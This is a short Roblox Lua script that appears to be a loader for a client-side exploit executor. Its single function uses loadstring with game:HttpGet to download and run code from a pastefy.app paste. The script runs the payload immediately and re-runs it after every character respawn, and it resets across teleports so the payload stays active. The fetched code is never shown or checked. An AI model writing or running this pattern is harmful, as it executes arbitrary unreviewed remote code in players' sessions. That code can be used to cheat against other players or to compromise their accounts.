local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

local executed = false

local function execute()
    if executed then return end
    executed = true
    loadstring(game:HttpGet("https://pastefy.app/iCaA9Bs0/raw"))()
end

-- fires on initial execute
execute()

-- rehook on character/game reload without process restart
Players.LocalPlayer.CharacterAdded:Connect(function()
    task.wait(2) -- let game load in
    executed = false
    execute()
end)

-- catches teleports too
game:GetService("TeleportService").TeleportInitiated:Connect(function()
    executed = false
end)
